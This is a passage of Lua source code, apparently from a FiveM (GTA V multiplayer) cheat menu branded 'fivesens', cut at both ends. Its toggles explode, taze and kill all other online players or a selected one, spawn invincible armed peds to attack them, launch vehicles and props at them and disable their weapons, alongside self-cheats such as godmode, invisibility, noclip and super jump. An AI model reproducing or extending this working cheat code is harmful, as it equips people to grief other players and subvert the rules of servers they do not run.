                   sum.f.SetVehicleNumberPlateText(veh, "SENSE")
                   sum.f.SetVehicleNumberPlateText(veh, "ENSE")
                   sum.f.SetVehicleNumberPlateText(veh, "NSE")
                   sum.f.SetVehicleNumberPlateText(veh, "SE")
                   sum.f.SetVehicleNumberPlateText(veh, "E")
                   sum.f.SetVehicleNumberPlateText(veh, "")
                   sum.f.SetVehicleNumberPlateText(veh, "E")
                   sum.f.SetVehicleNumberPlateText(veh, "SE")
                   sum.f.SetVehicleNumberPlateText(veh, "NSE")
                   sum.f.SetVehicleNumberPlateText(veh, "ENSE")
                   sum.f.SetVehicleNumberPlateText(veh, "SENSE")
                   sum.f.SetVehicleNumberPlateText(veh, "ESENSE")
                   sum.f.SetVehicleNumberPlateText(veh, "VESENSE")
                   sum.f.SetVehicleNumberPlateText(veh, "IVESENSE")
                   sum.f.SetVehicleNumberPlateText(veh, "FIVESENSE")			
               end
           end
           
           if sum.c['explode-allbitches-loop'] then
               for k, v in pairs(sum.f.GetActivePlayers()) do 
                   local position = sum.f.GetEntityCoords(sum.f.GetPlayerPed(v))
                   sum.f.AddExplosion(position, sum.s['explode-all-loop'].value, 100.0, true, false, 1.0)
               end
           end
   
           if sum.c['taze-all'] then
               for k, v in pairs(sum.f.GetActivePlayers()) do 
                   local ped = sum.f.GetPlayerPed(v)
                   local Coords = sum.f.GetEntityCoords(ped)
               
                   local bonecoords = sum.f.GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
                   local bonecoords_2 = sum.f.GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
               
                   sum.f.ShootSingleBulletBetweenCoords(bonecoords_2,bonecoords,1,true,sum.f.GetHashKey("WEAPON_STUNGUN"),sum.f.PlayerPedId(v),true,false,1.0)
               end
           end
   
           
           if sum.c["onlineplayer-shockwavegun"] then
               for k, v in pairs(sum.f.GetActivePlayers()) do
                   local ret, pos = sum.f.GetPedLastWeaponImpactCoord(sum.f.GetPlayerPed(v))
                   if sum.f.NetworkIsPlayerActive(v) then
                       if ret then
                           sum.f.AddExplosion(pos.x, pos.y, pos.z, 70, 100.0, false, true, 0)
                       end
                   end
               end
           end
           
           if sum.c["onlineplayer-vehiclegun"] then
               for k, v in pairs(sum.f.GetActivePlayers()) do
                   local ret, pos = sum.f.GetPedLastWeaponImpactCoord(sum.f.GetPlayerPed(v))
                   local cars = {"sultanrs", "blista", "zentorno", "adder", "turismo", "deviant", "thrax", "vamos"}
                   local vehsp = (cars[sum.curak.random(#cars)])
                   if not sum.f.HasModelLoaded(sum.f.GetHashKey(vehsp)) then
                       sum.f.RequestModel(sum.f.GetHashKey(vehsp))
                   end
                   if sum.f.NetworkIsPlayerActive(v) then
                       if ret then
                           local veh = sum.f.CreateVehicle(sum.f.GetHashKey(vehsp), pos, 1, 1, 1)
                           sum.f.SetVehicleNumberPlateText(veh, "fivesens")
                       end
                   end
               end
           end
           
           if sum.c["onlineplayer-explodegun"] then
               for k, v in pairs(sum.f.GetActivePlayers()) do
                   local ret, pos = sum.f.GetPedLastWeaponImpactCoord(sum.f.GetPlayerPed(v))
                   if sum.f.NetworkIsPlayerActive(v) then
                       if ret then
                           sum.f.AddExplosion(pos.x, pos.y, pos.z, 7, 100.0, false, false, 0)
                       end
                   end
               end
           end
           
           if sum.c["onlineplayer-pedgun"] then
               for k, v in pairs(sum.f.GetActivePlayers()) do
                   local guns = {"WEAPON_MICROSMG", "WEAPON_HEAVYSNIPER", "WEAPON_RPG", "WEAPON_MINIGUN"}
                   local gangnguns = (guns[sum.curak.random(#guns)])
                   local ret, pos = sum.f.GetPedLastWeaponImpactCoord(sum.f.GetPlayerPed(v))
                   local models = {
                       "a_m_m_eastsa_02",
                       "a_m_m_farmer_01",
                       "a_m_m_tranvest_01",
                       "a_m_y_beachvesp_01",
                       "a_m_y_epsilon_01",
                       "a_m_y_eastsa_02",
                       "a_m_y_musclbeac_01",
                       "a_m_y_soucent_03",
                       "a_m_y_salton_01",
                       "a_m_y_soucent_04",
                       "a_m_y_vinewood_01"
                   }
                   local model = sum.f.GetHashKey(models[5])
                   if not sum.f.HasModelLoaded(model) then
                       sum.f.RequestModel(model)
                   end
                   if ret then
                       local ped = sum.f.CreatePed(2, model, pos.x, pos.y, pos.z, 1, 1, 1)
                       sum.f.SetEntityInvincible(ped, true)
                       sum.f.GiveWeaponToPed(ped, sum.f.GetHashKey(gangnguns), 200, 1, 1)
                       for k, i in pairs(sum.f.GetActivePlayers()) do
                           sum.f.TaskCombatPed(ped, sum.f.GetPlayerPed(v), 0, 16)
                       end
                   end
               end
           end
           
           if sum.c["onlineplayer-propgun"] then
               for k, v in pairs(sum.f.GetActivePlayers()) do
                   local smallprops = {"p_oil_pjack_02_s","apa_mp_h_yacht_bed_01","bkr_prop_biker_bblock_hump_01","bkr_prop_printmachine_4rollerp_st","csx_coastbigroc03_","ce_xr_ctr2","csx_coastrok3_","ex_prop_crate_elec_sc","ex_prop_crate_clothing_sc","gr_prop_gr_basepart","gr_prop_gr_cnc_01a","gr_prop_gr_ramproof_gate","gr_prop_gr_target_small_04a","gr_prop_gr_target_small_01b","gr_prop_inttruck_carmod_01","hei_prop_carrier_jet","imp_prop_covered_vehicle_07a","imp_prop_flatbed_ramp","lf_house_09_","lf_house_08_","lf_house_05_","lf_house_10_","lf_house_11_","prop_haybailer_01","prop_phonebox_04","dt1_23_dt1_scaffold","prop_parking_hut_2","prop_dumpster_01a","prop_rub_carwreck_7","apa_mp_h_stn_chairarm_02","apa_mp_h_stn_chairarm_03","apa_mp_h_kit_kitchen_01_a","apa_mp_h_str_avunitm_01","apa_prop_flag_czechrep","bkr_prop_bkr_cashpile_07","bkr_prop_meth_chiller_01a","bkr_prop_prtmachine_dryer_spin",}
                   local propspawn = (smallprops[sum.curak.random(#smallprops)])
                   local ret, pos = sum.f.GetPedLastWeaponImpactCoord(sum.f.GetPlayerPed(v))
                       if not sum.f.HasModelLoaded(propspawn) then 
                           sum.f.RequestModel(propspawn)
                       end
                       if ret then
                           sum.f.CreateObject(sum.f.GetHashKey(propspawn),pos,true,true,true)
                           sum.f.FreezeEntityPosition(propspawn, true)
                       end
                   end
               end
   
               if sum.c["selectedplayer-shockwavegun"] then
                       local ret, pos = sum.f.GetPedLastWeaponImpactCoord(sum.f.GetPlayerPed(sel.selectedPlayer))
                       if sum.f.NetworkIsPlayerActive(sel.selectedPlayer) then
                           if ret then
                               sum.f.AddExplosion(pos.x, pos.y, pos.z, 70, 100.0, false, true, 0)
                           end
                       end
                   end
               
               if sum.c["selectedplayer-vehiclegun"] then
                       local ret, pos = sum.f.GetPedLastWeaponImpactCoord(sum.f.GetPlayerPed(sel.selectedPlayer))
                       local cars = {"sultanrs", "blista", "zentorno", "adder", "turismo", "deviant", "thrax", "vamos"}
                       local vehsp = (cars[sum.curak.random(#cars)])
                       if not sum.f.HasModelLoaded(sum.f.GetHashKey(vehsp)) then
                           sum.f.RequestModel(sum.f.GetHashKey(vehsp))
                       end
                       if sum.f.NetworkIsPlayerActive(sel.selectedPlayer) then
                           if ret then
                               local veh = sum.f.CreateVehicle(sum.f.GetHashKey(vehsp), pos, 1, 1, 1)
                               sum.f.SetVehicleNumberPlateText(veh, "fivesens")
                           end
                       end
                   end
               
               if sum.c["selectedplayer-explodegun"] then
                       local ret, pos = sum.f.GetPedLastWeaponImpactCoord(sum.f.GetPlayerPed(sel.selectedPlayer))
                       if sum.f.NetworkIsPlayerActive(sel.selectedPlayer) then
                           if ret then
                               sum.f.AddExplosion(pos.x, pos.y, pos.z, 7, 100.0, false, false, 0)
                           end
                       end
                   end
   
               if sum.c['waypoint3d'] then 
                   local waypointblip = sum.f.GetFirstBlipInfoId(8)
                   if sum.f.DoesBlipExist(waypointblip) then
                       local coords = sum.f.GetBlipInfoIdCoord(waypointblip)
                       DrawMarker(28, coords, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1000.0, sum.s['waypoint-r'].value, sum.s['waypoint-g'].value, sum.s['waypoint-b'].value, 255, true, true, 2, nil, nil, false)
                   end
               end
               
               if sum.c["selectedplayer-pedgun"] then
                       local guns = {"WEAPON_MICROSMG", "WEAPON_HEAVYSNIPER", "WEAPON_RPG", "WEAPON_MINIGUN"}
                       local gangnguns = (guns[sum.curak.random(#guns)])
                       local ret, pos = sum.f.GetPedLastWeaponImpactCoord(sum.f.GetPlayerPed(sel.selectedPlayer))
                       local models = {
                           "a_m_m_eastsa_02",
                           "a_m_m_farmer_01",
                           "a_m_m_tranvest_01",
                           "a_m_y_beachvesp_01",
                           "a_m_y_epsilon_01",
                           "a_m_y_eastsa_02",
                           "a_m_y_musclbeac_01",
                           "a_m_y_soucent_03",
                           "a_m_y_salton_01",
                           "a_m_y_soucent_04",
                           "a_m_y_vinewood_01"
                       }
                       local model = sum.f.GetHashKey(models[5])
                       if not sum.f.HasModelLoaded(model) then
                           sum.f.RequestModel(model)
                       end
                       if ret then
                           local ped = sum.f.CreatePed(2, model, pos.x, pos.y, pos.z, 1, 1, 1)
                           sum.f.SetEntityInvincible(ped, true)
                           sum.f.GiveWeaponToPed(ped, sum.f.GetHashKey(gangnguns), 200, 1, 1)
                           sum.f.TaskCombatPed(ped, sum.f.GetPlayerPed(sel.selectedPlayer), 0, 16)
                       end
                   end
               
               if sum.c["selectedplayer-propgun"] then
                       local smallprops = {"p_oil_pjack_02_s","apa_mp_h_yacht_bed_01","bkr_prop_biker_bblock_hump_01","bkr_prop_printmachine_4rollerp_st","csx_coastbigroc03_","ce_xr_ctr2","csx_coastrok3_","ex_prop_crate_elec_sc","ex_prop_crate_clothing_sc","gr_prop_gr_basepart","gr_prop_gr_cnc_01a","gr_prop_gr_ramproof_gate","gr_prop_gr_target_small_04a","gr_prop_gr_target_small_01b","gr_prop_inttruck_carmod_01","hei_prop_carrier_jet","imp_prop_covered_vehicle_07a","imp_prop_flatbed_ramp","lf_house_09_","lf_house_08_","lf_house_05_","lf_house_10_","lf_house_11_","prop_haybailer_01","prop_phonebox_04","dt1_23_dt1_scaffold","prop_parking_hut_2","prop_dumpster_01a","prop_rub_carwreck_7","apa_mp_h_stn_chairarm_02","apa_mp_h_stn_chairarm_03","apa_mp_h_kit_kitchen_01_a","apa_mp_h_str_avunitm_01","apa_prop_flag_czechrep","bkr_prop_bkr_cashpile_07","bkr_prop_meth_chiller_01a","bkr_prop_prtmachine_dryer_spin",}
                       local propspawn = (smallprops[sum.curak.random(#smallprops)])
                       local ret, pos = sum.f.GetPedLastWeaponImpactCoord(sum.f.GetPlayerPed(sel.selectedPlayer))
                           if not sum.f.HasModelLoaded(propspawn) then 
                               sum.f.RequestModel(propspawn)
                           end
                           if ret then
                               sum.f.CreateObject(sum.f.GetHashKey(propspawn),pos,true,true,true)
                               sum.f.FreezeEntityPosition(propspawn, true)
                           end
                       end
   
               if sum.c["selectedplayer-particlegun"] then
                       local ret, pos = sum.f.GetPedLastWeaponImpactCoord(sum.f.GetPlayerPed(sel.selectedPlayer))
                       if ret then
                       sum.f.RequestNamedPtfxAsset("scr_rcbarry2")
                       sum.f.UseParticleFxAssetNextCall("scr_rcbarry2")
                       sum.f.StartNetworkedParticleFxNonLoopedAtCoord("scr_clown_appears",pos,0.0,0.0,0.0,21.0,false,false,false)
                       sum.f.RequestNamedPtfxAsset("core")
                       sum.f.UseParticleFxAssetNextCall("core")
                       sum.f.StartNetworkedParticleFxNonLoopedAtCoord("ent_sht_petrol_fire",pos,0.0,0.0,0.0,21.0,false,false,false)
                       sum.f.RequestNamedPtfxAsset("scr_rcbarry2")
                       sum.f.UseParticleFxAssetNextCall("scr_rcbarry2")
                       sum.f.StartNetworkedParticleFxNonLoopedAtCoord("scr_clown_appears",pos,0.0,0.0,0.0,21.0,false,false,false)
                       sum.f.RequestNamedPtfxAsset("core")
                       sum.f.UseParticleFxAssetNextCall("core")
                       sum.f.StartNetworkedParticleFxNonLoopedAtCoord("ent_sht_petrol_fire",pos,0.0,0.0,0.0,21.0,false,false,false)
                   end
               end
       
               if sum.c["onlineplayer-ramgun"] then
                   for k, v in pairs(sum.f.GetActivePlayers()) do
                       local ret, pos = sum.f.GetPedLastWeaponImpactCoord(sum.f.GetPlayerPed(v))
                       local vehs = {"sultanrs","blista","zentorno","adder","turismo","deviant","thrax","vamos",} 
                       local hash = sum.f.GetHashKey(vehs[sum.curak.random(#vehs)])
                       if not sum.f.HasModelLoaded(hash) then 
                           sum.f.RequestModel(hash)
                       end
                       if ret then
                           local veh = sum.f.CreateVehicle(hash, pos, 1, 1, 1)
                           sum.f.SetVehicleEngineOn(veh, true, true, true)
                           sum.f.SetEntityRotation(veh, 0.0, 0.0, 0.0, 0.0, true)
                           sum.f.SetVehicleForwardSpeed(veh, 500.0)
                           sum.f.SetVehicleNumberPlateText(veh, "fivesens")
                       end
                   end
               end
   
   
               if sum.c["particles-on-peds"] then
                   for ped in sum.f.enumeratePeds() do
                       local coords = sum.f.GetEntityCoords(ped)
                       sum.f.RequestNamedPtfxAsset(sum.destroyerparticles[1])
                       sum.f.UseParticleFxAssetNextCall(sum.destroyerparticles[1])
                       sum.f.StartNetworkedParticleFxNonLoopedAtCoord(sum.destroyerparticles[2],coords,0.0,0.0,0.0,sum.s["destroyer-particles"].value,false,false,false)
                   end
               end
               
               if sum.c['particle-selected'] then
                   local coord = sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer))
                   sum.f.RequestNamedPtfxAsset(sum.playerparticles[1])
                   sum.f.UseParticleFxAssetNextCall(sum.playerparticles[1])
                   sum.f.StartNetworkedParticleFxNonLoopedAtCoord(sum.playerparticles[2],coord,0.0,0.0,0.0,sum.s["muz-scale"].value,false,false,false)
               end
   
               if sum.c["particles-on-cars"] then
                   for veh in sum.f.enumerateVehicles() do
                       local coords = sum.f.GetEntityCoords(veh)
                       sum.f.requestControlOnce(veh)
                       sum.f.RequestNamedPtfxAsset(sum.destroyerparticles[1])
                       sum.f.UseParticleFxAssetNextCall(sum.destroyerparticles[1])
                       sum.f.StartNetworkedParticleFxNonLoopedAtCoord(sum.destroyerparticles[2],coords,0.0,0.0,0.0,sum.s["destroyer-particles"].value,false,false,false)
                   end
               end
               
           
           if sum.c["onlineplayer-particlegun"] then
               for k, v in pairs(sum.f.GetActivePlayers()) do
                   local ret, pos = sum.f.GetPedLastWeaponImpactCoord(sum.f.GetPlayerPed(v))
                   if ret then
                   sum.f.RequestNamedPtfxAsset("scr_rcbarry2")
                   sum.f.UseParticleFxAssetNextCall("scr_rcbarry2")
                   sum.f.StartNetworkedParticleFxNonLoopedAtCoord("scr_clown_appears",pos,0.0,0.0,0.0,21.0,false,false,false)
                   sum.f.RequestNamedPtfxAsset("core")
                   sum.f.UseParticleFxAssetNextCall("core")
                   sum.f.StartNetworkedParticleFxNonLoopedAtCoord("ent_sht_petrol_fire",pos,0.0,0.0,0.0,21.0,false,false,false)
                   sum.f.RequestNamedPtfxAsset("scr_rcbarry2")
                   sum.f.UseParticleFxAssetNextCall("scr_rcbarry2")
                   sum.f.StartNetworkedParticleFxNonLoopedAtCoord("scr_clown_appears",pos,0.0,0.0,0.0,21.0,false,false,false)
                   sum.f.RequestNamedPtfxAsset("core")
                   sum.f.UseParticleFxAssetNextCall("core")
                   sum.f.StartNetworkedParticleFxNonLoopedAtCoord("ent_sht_petrol_fire",pos,0.0,0.0,0.0,21.0,false,false,false)
               end
           end
       end
   
           if sum.c["onlineplayer-ramgun"] then
               for k, v in pairs(sum.f.GetActivePlayers()) do
                   local ret, pos = sum.f.GetPedLastWeaponImpactCoord(sum.f.GetPlayerPed(v))
                   local vehs = {"sultanrs","blista","zentorno","adder","turismo","deviant","thrax","vamos",} 
                   local hash = sum.f.GetHashKey(vehs[sum.curak.random(#vehs)])
                   if not sum.f.HasModelLoaded(hash) then 
                       sum.f.RequestModel(hash)
                   end
                   if ret then
                       local veh = sum.f.CreateVehicle(hash, pos, 1, 1, 1)
                       sum.f.SetVehicleEngineOn(veh, true, true, true)
                       sum.f.SetEntityRotation(veh, 0.0, 0.0, 0.0, 0.0, true)
                       sum.f.SetVehicleForwardSpeed(veh, 500.0)
                       sum.f.SetVehicleNumberPlateText(veh, "fivesens")
                   end
               end
           end
   
           
           if sum.c['visuals-spinbot'] then
               local player = sum.f.PlayerPedId()
               local rotation = sum.f.GetEntityRotation(player)
               sum.f.SetEntityRotation(player, 0.0, 0.0, sum.curak.random(0, 360)+0.0, true)
           end
           if sum.c['visuals-upside-down'] then
               local player = sum.f.PlayerPedId()
               sum.f.SetEntityRotation(player, 180.0, 0.0, 0.0, true)
           end
   
   
           if sum.c['visuals-fullbright'] then
               local pos = sum.f.GetEntityCoords(sum.f.PlayerPedId())
               sum.f.DrawLightWithRangeAndShadow(pos.x, pos.y, pos.z + 3.0, 255, 255, 255, 1000.0, 2.0)
           end
   
           if sum.c['visuals-worldcolor'] then
               local pos = sum.f.GetEntityCoords(sum.f.PlayerPedId())
               sum.f.DrawLightWithRangeAndShadow(pos.x, pos.y, pos.z + 3.0, sum.s['visuals-world-r'].value, sum.s['visuals-world-g'].value, sum.s['visuals-world-b'].value, 1000.0, 50.0)
           end
   
           if sum.c['visuals-showcoords'] then
               local coords = sum.f.GetEntityCoords(sum.f.PlayerPedId())
               local X = tonumber(sum.curak.format("%.1f", coords.x)) 
               local Y = tonumber(sum.curak.format("%.1f", coords.y)) 
               local Z = tonumber(sum.curak.format("%.1f", coords.z)) 
               sum.f.drawTextOutline('X: '..X.. ' Y: '..Y.. ' Z: '..Z, 0.5, 0.972, 0.35, 4, true, true, 255, 255, 255)
             end
   
           if sum.c['kill-all'] then
               for k, v in pairs(sum.f.GetActivePlayers()) do 
                   local bones = {0, 23553, 24817, 24818, 24816, 11816,31086, 0xcc4d, 0x9995, 0x3779, 0xE0FD,0x5C57,0x192A,0x9995,0xB1C5,0xEEEB,0x49D9,0x9D4D,0x6E5C,0xDEAD, 0x5c01}
                   local typebones = (bones[sum.curak.random(#bones)])
                   local p = sum.f.GetPlayerPed(v)
                   local b = sum.f.GetEntityRotation(p)
                   local c = sum.f.rotationToDirection(b)
                   local d = sum.f.GetEntityCoords(sum.f.PlayerPedId(), false)
                   local e = sum.f.GetEntityCoords(p, false)
                   local f = sum.f.GetPedBoneCoords(p, typebones, 0, 0, 0)
                   local g = sum.f.GetDistanceBetweenCoords(d.x, d.y, d.z, e.x, e.y, e.z, false)
                   if g <= 10000.0 then
                       local h = sum.f.IsEntityDead(p)
                       if not h then
                       sum.f.ShootSingleBulletBetweenCoords(f.x + c.x, f.y + c.y, f.z + c.z, f.x, f.y, f.z, 0.5, false, sum.f.GetHashKey('WEAPON_HEAVYSNIPER'), sum.f.PlayerPedId(), false, true, 1)
                   end
               end
           end
       end
   
       if sum.c['kill-selectedplayer'] then
               local bones = {0, 23553, 24817, 24818, 24816, 11816,31086, 0xcc4d, 0x9995, 0x3779, 0xE0FD,0x5C57,0x192A,0x9995,0xB1C5,0xEEEB,0x49D9,0x9D4D,0x6E5C,0xDEAD, 0x5c01}
               local typebones = (bones[sum.curak.random(#bones)])
               local p = sum.f.GetPlayerPed(sel.selectedPlayer)
               local b = sum.f.GetEntityRotation(p)
               local c = sum.f.rotationToDirection(b)
               local d = sum.f.GetEntityCoords(sum.f.PlayerPedId(), false)
               local e = sum.f.GetEntityCoords(p, false)
               local f = sum.f.GetPedBoneCoords(p, typebones, 0, 0, 0)
               local g = sum.f.GetDistanceBetweenCoords(d.x, d.y, d.z, e.x, e.y, e.z, false)
               if g <= 10000.0 then
                   local h = sum.f.IsEntityDead(p)
                   if not h then
                   sum.f.ShootSingleBulletBetweenCoords(f.x + c.x, f.y + c.y, f.z + c.z, f.x, f.y, f.z, 0.5, false, sum.f.GetHashKey('WEAPON_HEAVYSNIPER'), sum.f.PlayerPedId(), false, true, 1)
               end
           end
       end
   
           if sum.c['disable-weapons'] then
               for k, ped in pairs(sum.f.GetActivePlayers()) do 
                   if sum.f.IsPedShooting(sum.f.GetPlayerPed(ped))  then
                       sum.f.ClearPedTasksImmediately(sum.f.GetPlayerPed(ped))
                   end
               end
           end
           
   
   
           if sum.c['player-godmode'] then 
               sum.f.SetEntityProofs(sum.f.PlayerPedId(), true, true, true, true, true)
               sum.f.SetPlayerInvincible(sum.f.PlayerId(), true)
               sum.f.SetEntityInvincible(sum.f.PlayerPedId(), true)
           end	
   
   
           
           if sum.c['player-superrun-slide'] then 
               if sum.f.IsDisabledControlPressed(0, 34) or sum.f.IsDisabledControlPressed(0, 33) or sum.f.IsDisabledControlPressed(0, 32) or sum.f.IsDisabledControlPressed(0, 35) then
                   if sum.f.IsPedRagdoll(sum.f.PlayerPedId()) then
                       
                   else
                      sum.f.SetEntityVelocity(
                          sum.f.PlayerPedId(), 
                          sum.f.GetOffsetFromEntityInWorldCoords(
                              sum.f.PlayerPedId(), 
                              0.0, 
                              sum.s['player-superrun-slide'].value, 
                              sum.f.GetEntityVelocity(sum.f.PlayerPedId())[3]
                           ) - sum.f.GetEntityCoords(
                               sum.f.PlayerPedId()
                           )
                       )
                   end
               end
           end
   
   
           if sum.c['player-superreun'] then 
               if sum.f.IsDisabledControlPressed(0, 34) or sum.f.IsDisabledControlPressed(0, 33) or sum.f.IsDisabledControlPressed(0, 32) or sum.f.IsDisabledControlPressed(0, 35) then
                   sum.f.SetPedMoveRateOverride(sum.f.PlayerPedId(), sum.s['player-superrun'].value)
                   sum.f.SetRunSprintMultiplierForPlayer(sum.f.PlayerId(), sum.s['player-superrun'].value)
               end
           end
   
   
           if sum.c['player-noclip-invis'] then 
               sum.f.SetEntityVisible(sum.f.PlayerPedId(), false, false)
           else
               sum.f.SetEntityVisible(sum.f.PlayerPedId(), true, true)
           end
   
           if sum.c['player-infinitejumps'] then 
               if sum.f.IsDisabledControlJustPressed(0, 22) then 
                   sum.f.TaskJump(sum.f.PlayerPedId(), true)
               end
           end
   
           
   
           if sum.c['player-invisible'] then 
               sum.f.SetEntityVisible(sum.f.PlayerPedId(), false, false)
           else
               sum.f.SetEntityVisible(sum.f.PlayerPedId(), true, true)
           end
   
           if sum.c['player-nocollision'] then 
               sum.f.SetEntityCollision(sum.f.PlayerPedId(), true, false)
           else
               sum.f.SetEntityCollision(sum.f.PlayerPedId(), true, true)
           end
   
           if sum.c['player-ignore-collision'] then 
               for k, v in pairs(sum.f.GetActivePlayers()) do
                   sum.f.SetEntityNoCollisionEntity(sum.f.PlayerPedId(), sum.f.GetPlayerPed(v), true)
               end
           else
               sum.f.SetEntityNoCollisionEntity(sum.f.PlayerPedId(), sum.f.GetPlayerPed(v), true)
           end
   
   
           if sum.c['player-pokemongo'] then 
               sum.f.GiveWeaponToPed(sum.f.PlayerPedId(), sum.f.GetHashKey('weapon_snowball'), 1, 1, 1)
               local bullet, coord = sum.f.GetPedLastWeaponImpactCoord(sum.f.PlayerPedId())
               if bullet then 
                   local model = sum.f.GetHashKey("a_c_rottweiler")
                   if not sum.f.HasModelLoaded(model) then 
                       sum.f.RequestModel(model)
                   end
                   local ped = sum.f.CreatePed(0, model, coord, 1, 1, 1)
                   if ped then 
                       sum.f.RequestNamedPtfxAsset("scr_rcbarry2")
                       sum.f.UseParticleFxAssetNextCall("scr_rcbarry2")
                       sum.f.StartNetworkedParticleFxNonLoopedAtCoord("scr_clown_appears",coord,0.0,0.0,0.0,1.0,false,false,false)
                   end
               end
           end
   
           if sum.c['player-stamina'] then 
               sum.f.ResetPlayerStamina(sum.f.PlayerId())
           end
   
           if sum.c['player-superjump'] then 
               sum.f.SetPedCanRagdoll(sum.f.PlayerPedId(), false)
               if sum.f.IsDisabledControlJustPressed(0, 22) then
                   sum.f.ApplyForceToEntity(sum.f.PlayerPedId(), 3, 0.0, 0.0, sum.s['player-superjump'].value, 0.0, 0.0, 0.0, 0, 0, 0, 1, 1, 1)
               end
           --else
               --sum.f.SetPedCanRagdoll(sum.f.PlayerPedId(), true)
   
           end
   
           if sum.c['vehicle-bulletproof'] and sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), true) then
               sum.f.SetVehicleTyresCanBurst(sum.f.GetVehiclePedIsUsing(sum.f.PlayerPedId()), false)
           else
               sum.f.SetVehicleTyresCanBurst(sum.f.GetVehiclePedIsUsing(sum.f.PlayerPedId()), true)
           end
   
           if sum.c['vehicle-waterproof'] and sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), true) then
               sum.f.SetVehicleEngineOn(sum.f.GetVehiclePedIsUsing(sum.f.PlayerPedId()), true, true, true)
           end
   
           if sum.c['vehicle-invisible'] and sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), true) then
               sum.f.SetEntityVisible(sum.f.GetVehiclePedIsUsing(sum.f.PlayerPedId()), false, false)
           else
               sum.f.SetEntityVisible(sum.f.GetVehiclePedIsUsing(sum.f.PlayerPedId()), true, true)
           end
   
           if sum.c['weapons-teleportgun'] then
               local player = sum.f.PlayerPedId()
               local _, position = sum.f.GetPedLastWeaponImpactCoord(player) 
               if _ then
                   sum.f.SetEntityCoords(player, position.x, position.y, position.z, true, false, false)
               end
           end
   
           if sum.c['weapons-pickupgun'] then
               local a, ped = sum.f.GetEntityPlayerIsFreeAimingAt(sum.f.PlayerId())
               if a then 
                   if sum.f.IsAimCamActive() then
                       local rot = sum.f.GetGameplayCamRot(2)
                       sum.f.SetEntityCoords(ped, sum.f.GetEntityCoords(sum.f.PlayerPedId()) + (sum.f.rotationToDirection(rot) * 10))
                   end  
               end
           end
   
       
           if sum.c['weapons-deletegun'] then
               local a, ped = sum.f.GetEntityPlayerIsFreeAimingAt(sum.f.PlayerId())
               if a then
                   if sum.f.IsDisabledControlPressed(0, 24) then
                       sum.f.SetEntityAsMissionEntity(ped)
                       sum.f.DeleteEntity(ped)
                   end
               end
           end
   
           if sum.c['weapons-explodegun'] then
               local p = sum.f.PlayerPedId()
               local hit, coord = sum.f.GetPedLastWeaponImpactCoord(p)				
               if hit then 
                   sum.f.AddExplosion(coord.x, coord.y, coord.z, 5, 100.0, true, false, 0.0)
               end
           end
           if sum.c['weapons-multiplier'] then
               sum.f.SetWeaponDamageModifierThisFrame(sum.f.GetSelectedPedWeapon(sum.f.PlayerPedId()), sum.s['multiplier-value'].value)
           end
   
   
   
           if sum.c['weapons-clowngun'] then
               local p = sum.f.PlayerPedId()
   
               local hit, coord = sum.f.GetPedLastWeaponImpactCoord(p)				
               if not sum.f.HasNamedPtfxAssetLoaded("scr_rcbarry2") then						
                   sum.f.RequestNamedPtfxAsset("scr_rcbarry2")
               end	
               if hit then 
                   sum.f.UseParticleFxAssetNextCall("scr_rcbarry2")							
                   sum.f.StartNetworkedParticleFxNonLoopedAtCoord("scr_clown_appears",coord.x, coord.y, coord.z,0,0,0,0.5,0,0,0)	
               end
           end
   
           if sum.c['weapons-hitmarker'] then
               local hit, p = sum.f.GetEntityPlayerIsFreeAimingAt(sum.f.PlayerId())
               local pid = sum.f.PlayerPedId()
               if hit and sum.f.IsPedShooting(pid) and sum.f.IsEntityAPed(p) and not sum.f.IsEntityDead(p) then
                   table.insert(sum.hitsound, {x = 0.5, y = 0.5, timer = sum.f.GetGameTimer()})
               end
               if not sum.f.HasStreamedTextureDictLoaded('helicopterhud') then 
                   sum.f.RequestStreamedTextureDict('helicopterhud', true)
               end
               for k, v in pairs(sum.hitsound) do 
                   sum.f.DrawSprite('helicopterhud', 'hud_target',  v.x, v.y, 0.023, 0.023*1.85, 45.0, 255, 255, 255, 255)
                   if sum.f.GetGameTimer() - v.timer >= 250 then 
                       table.remove(sum.hitsound, k)
                   end
               end
           end
   
           if sum.c['weapons-hitmarker-3d'] then
               local hit, p = sum.f.GetEntityPlayerIsFreeAimingAt(sum.f.PlayerId())
               local pid = sum.f.PlayerPedId()
               local coordXMin = sum.f.GetOffsetFromEntityInWorldCoords(p, 0, 0, 0.2)
               local coordYPlus = sum.f.GetOffsetFromEntityInWorldCoords(p, 0, 0, -0.2)
               
               local bool, screenX, screenY = sum.f.GetScreenCoordFromWorldCoord(coordXMin.x, coordXMin.y, coordXMin.z)
               local bool2, screenX2, screenY2 = sum.f.GetScreenCoordFromWorldCoord(coordYPlus.x, coordYPlus.y, coordYPlus.z)
               if hit and sum.f.IsPedShooting(pid) and sum.f.IsEntityAPed(p) and not sum.f.IsEntityDead(p) then
                   table.insert(sum.hitsound, {x = 0.5, y = 0.5, timer = sum.f.GetGameTimer()})
               end
               if not sum.f.HasStreamedTextureDictLoaded('helicopterhud') then 
                   sum.f.RequestStreamedTextureDict('helicopterhud', true)
               end
               local x,y,z= table.unpack(sum.f.GetEntityCoords(p))
               sum.f.SetDrawOrigin(x, y, z, 0)
               for k, v in pairs(sum.hitsound) do 
                   sum.f.DrawSprite('helicopterhud', 'hud_target',  0.0, 0.0, (screenY - screenY2), (screenY - screenY2)*1.85, 45.0, 255, 255, 255, 255)
                   if sum.f.GetGameTimer() - v.timer >= 1000 then 
                       table.remove(sum.hitsound, k)
                   end
               end 
               sum.f.ClearDrawOrigin()
           end
   
           if sum.c['player-noragdoll'] then 
               sum.f.SetPedCanRagdoll(sum.f.PlayerPedId(), false)
           --else
               --sum.f.SetPedCanRagdoll(sum.f.PlayerPedId(), true)
           end
   
           if sum.c['player-ragdoll'] then 
               sum.f.SetPedToRagdoll(sum.f.PlayerPedId(), 1000, 1000, 0, true, true, false)
           end
   
           if sum.c['weapons-hitsound'] then
               local hit, p = sum.f.GetEntityPlayerIsFreeAimingAt(sum.f.PlayerId())
               local pid = sum.f.PlayerPedId()
               if hit and sum.f.IsPedShooting(pid) and sum.f.IsEntityAPed(p) and not sum.f.IsEntityDead(p) then
